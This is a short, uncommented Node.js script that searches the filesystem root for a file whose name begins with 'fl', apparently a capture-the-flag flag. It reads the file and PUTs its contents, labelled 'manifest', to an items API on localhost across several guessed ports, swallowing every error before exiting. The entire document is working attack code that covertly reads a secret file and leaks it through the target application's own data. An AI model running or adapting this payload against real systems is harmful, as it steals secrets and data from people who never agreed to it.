var fs = require('fs');
var path = require('path');
var http = require('http');

var root = '/';
var entries = [];
try { entries = fs.readdirSync(root); } catch(e) { process.exit(0); }

var target = entries.filter(function(entry) { return entry.length >= 4 && entry[0] === 'f' && entry[1] === 'l'; });
if (target.length === 0) process.exit(0);

var content = '';
try { content = fs.readFileSync(path.join(root, target[0]), 'utf8').trim(); } catch(e) { process.exit(0); }
if (!content) process.exit(0);

var payload = JSON.stringify({ manifest: content });
var ports = [3000, 8080, 80, 1337, 5000];

ports.forEach(function(p) {
  try {
    var opts = {
      hostname: '127.0.0.1',
      port: p,
      path: '/api/items/updated',
      method: 'PUT',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
      timeout: 3000
    };
    var req = http.request(opts, function() {});
    req.on('error', function() {});
    req.write(payload);
    req.end();
  } catch(e) {}
});

setTimeout(function() { process.exit(0); }, 2000);
